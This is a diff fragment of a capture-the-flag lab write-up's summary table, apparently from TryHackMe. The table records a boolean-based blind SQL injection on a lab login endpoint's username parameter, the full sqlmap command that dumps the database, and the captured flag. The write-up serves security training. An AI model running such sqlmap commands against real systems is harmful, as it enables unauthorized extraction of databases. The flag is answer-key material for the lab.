@@ -328,5 +328,5 @@ Summary Table: Module 5 Details
 | Target Endpoint          | [http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)                                                             |
 | Vulnerable Parameter     | username                                                                                                                                           |
 | Exploit Technique        | Boolean-Based Blind SQL Injection                                                                                                                  |
-| Automation Tool Command  | "sqlmap -u ""[http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)"" --data=""username=admin&password=admin"" --  |level=5 --risk=3 --dbms=sqlite --technique=B --dump"
+| Automation Tool Command  | "sqlmap -u ""[http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)"" --data=""username=admin&password=admin"" --  | |                          | level=5 --risk=3 --dbms=sqlite --technique=B --dump"                                                                                               |
 | Captured Flag            | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}                                                                                                              |
